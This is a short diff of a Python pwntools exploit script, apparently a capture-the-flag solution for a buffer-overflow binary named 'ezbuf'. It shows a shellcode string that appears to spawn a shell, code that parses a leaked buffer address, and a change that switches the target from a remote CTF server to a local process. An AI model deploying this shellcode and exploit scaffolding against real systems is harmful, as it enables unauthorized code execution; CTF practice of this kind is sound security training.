@@ -10,7 +10,8 @@ shellcode="\x90\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\
 #shellcode = "\x90\x90\x90\x90\x90"
 
 #conn = remote("localhost", 4444) 
-conn = remote("9447.hack.sydney", 9001) 
+# conn = remote("9447.hack.sydney", 9001) 
+conn = process("./ezbuf")
 conn.recvuntil("\n")
 recieved = conn.recvuntil("\n")
 buffer_address = int(recieved[9:], 16)
